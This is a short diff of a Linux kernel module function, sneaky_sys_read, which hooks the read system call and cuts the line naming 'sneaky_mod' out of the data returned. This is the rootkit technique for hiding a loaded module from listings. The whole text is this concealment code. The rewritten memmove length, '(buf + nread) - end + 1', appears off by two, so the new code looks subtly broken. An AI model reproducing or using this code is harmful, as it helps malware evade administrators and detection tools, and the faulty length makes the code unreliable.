@@ -112,13 +112,12 @@ asmlinkage ssize_t sneaky_sys_read(struct pt_regs *regs){
     return 0;
   }
   else{
-    char * line_start = strstr(buf, "sneaky_mod ");
-    if (line_start != NULL) {
-      char * line_end = strchr(line_start, '\n');
-      if(line_end !=NULL){
-        line_end++;
-        memmove(line_start, line_end, (char __user*)(buf + nread) - line_end);
-        nread -= (ssize_t)(line_end - line_start);
+    char * start = strstr(buf, "sneaky_mod ");
+    if (start != NULL) {
+      char * end = strchr(start, '\n');
+      if(end !=NULL){
+        memmove(start, end + 1, (char __user*)(buf + nread) - end + 1);
+        nread -= (ssize_t)((end + 1) - start);
       }
     }
   }
